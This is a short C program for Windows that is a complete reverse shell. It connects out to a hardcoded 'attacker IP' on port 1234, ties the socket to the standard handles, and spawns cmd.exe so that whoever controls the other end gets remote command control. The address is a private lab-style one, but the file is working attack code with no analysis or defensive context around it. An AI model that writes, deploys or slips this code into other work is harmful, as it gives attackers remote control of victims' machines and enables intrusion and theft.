#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

int main() {
    // init Winsock
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    
    // set the variables to use IE: attacker IP to connect to and port to connect to
    char *server_ip = "192.168.56.102"; 
    int server_port = 1234; 
    
    // init Winsock
    WSAStartup(MAKEWORD(2,2), &wsa);
    
    // create the socket
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }
    
    // setup the server address struct
    server.sin_addr.s_addr = inet_addr(server_ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(server_port);
    
    // duplicate socket to stdin, stdout, stderr
    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {
        closesocket(s);
        WSACleanup();
        return 1;
    }
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) s;
    
    // spawn the shell
    if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) == 0) {
        closesocket(s);
        WSACleanup();
        return 1;
    }
    
    // wait for single object
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // cleanup
    closesocket(s);
    WSACleanup();
    return 0;
}